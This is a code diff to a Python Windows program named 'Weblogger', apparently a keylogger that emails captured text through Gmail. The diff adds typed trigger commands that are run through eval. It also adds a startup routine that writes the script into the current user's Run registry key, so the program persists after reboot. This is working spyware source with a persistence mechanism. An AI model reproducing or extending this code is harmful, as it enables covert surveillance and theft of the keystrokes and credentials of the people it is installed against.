@@ -133,15 +133,25 @@ class Weblogger(object):
             self.send_mail(data)
 
     def check_command(self):
-        KILL = 'webloggerkill'
         length = len(self.command)
+        commands = {
+            'webloggerkill': {'eval': 'self.kill()', 'message': 'Killing Weblogger'},
+            'webloggerstartup': {'eval': 'self.startup("add")', 'message': 'Adding Weblogger to Startup'},
+            'webloggernostartup': {'eval': 'self.startup("del")', 'message': 'Removing Weblogger from Startup'}
+        }
 
-        if self.command != KILL[0:length]:
+        if not any(map(lambda c: self.command == c[:length], commands.keys())):
             self.command = ''
-        elif length == len(KILL):
+            return
+
+        command = filter(lambda c: self.command == c, commands.keys())
+
+        if len(command) >= 1:
+            d = commands[command[0]]
             if self.LOGGING:
-                print('Killing Weblogger')
-            self.kill()
+                print(d['message'])
+            eval(d['eval'])
+            self.command = ''
 
     def send_mail(self, text):
         if not self.email_to or not all(self.GMAIL_DATA.values()):
@@ -250,6 +260,21 @@ class Weblogger(object):
 
         return text
 
+    @staticmethod
+    def startup(action):
+        from _winreg import OpenKey, SetValueEx, DeleteValue, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+
+        file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), os.path.basename(__file__))
+        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        reg_name = "Weblogger"
+
+        key2change = OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS)
+
+        if action == 'add':
+            SetValueEx(key2change, reg_name, 0, REG_SZ, file_path)
+        elif action == 'del':
+            DeleteValue(key2change, reg_name)
+
 
 if __name__ == '__main__':
     wl = Weblogger(email_to="")
@@ -264,7 +289,7 @@ if __name__ == '__main__':
     if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
         mutex = None
         if wl.LOGGING:
-            print "Multiple instance not allowed"
+            print "Multiple Instance not Allowed"
         exit(0)
 
     while True:
